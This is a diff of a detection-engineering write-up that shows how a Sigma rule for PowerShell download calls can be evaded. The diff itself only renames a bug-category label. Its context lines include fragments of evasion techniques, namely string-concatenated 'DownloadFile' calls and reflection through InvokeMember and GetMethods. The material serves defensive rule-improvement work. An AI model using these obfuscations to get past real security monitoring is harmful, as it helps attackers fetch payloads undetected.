@@ -127,7 +127,7 @@ level: medium
 	- The omission of other methods in powershell to download files.
 	- In ADE this falls under the bug categories, respectfully:
 		- **ADE1-01 Reformatting in Actions - Substring Manipulation**
-		- **ADE2-01 Omit Alternatives - API/Function**
+		- **ADE2-01 Omit Alternatives - Method/Binary**
 
 #### Bug 1: reliance on substrings that are mutable by the attacker.
 
@@ -157,7 +157,7 @@ $wc.("Download" + "File")($url,"DIRECTORY_TO_WRITE_TO\evil.txt")
 
 ##### Bypass 1: Taking advantage of string match reliance, and reflecting via InvokeMember
 
-> ADE Bug Category: Omit Alternative Methods - API/Function
+> ADE Bug Category: Omit Alternative Methods - Method/Binary
 
 ```PowerShell
 $url = "ADDRESS\evil.txt";
@@ -171,7 +171,7 @@ Look *carefully* at the Sigma rule and the hypothesis test notes above. *Conditi
 
 ##### Bypass 2: Taking advantage of string match reliance, and utilizing GetMethods
 
-> ADE Bug Category: Omit Alternative Methods - API/Function
+> ADE Bug Category: Omit Alternative Methods - Method/Binary
 
 ```PowerShell
 $url = "ADDRESS\evil.txt";
@@ -196,7 +196,7 @@ In the example, there were two bugs.
 1. The reliance on substrings that are mutable by the attacker
 	- `ADE Bug Category: Reformatting in Actions - Substring Manipulation`
 2. The omission of other methods in powershell to download files.
-		- `ADE Bug Category: Omit Alternative Methods - API/Function`
+		- `ADE Bug Category: Omit Alternative Methods - Method/Binary`
 
 The key issue that results in these was the chaining of `Web.Client` prior to the `OR` statement `".DownloadString(" OR ".DownloadFile("`. Because we know that `.DownloadString(` and `.DownloadFile(` can be obfuscated or replaced very easily in classic powershell, even without the `.` and `(` excluded, we don't need to worry about obfuscating `Web.Client`. according to the [Sigma search specification](https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-rules-specification.md).
 
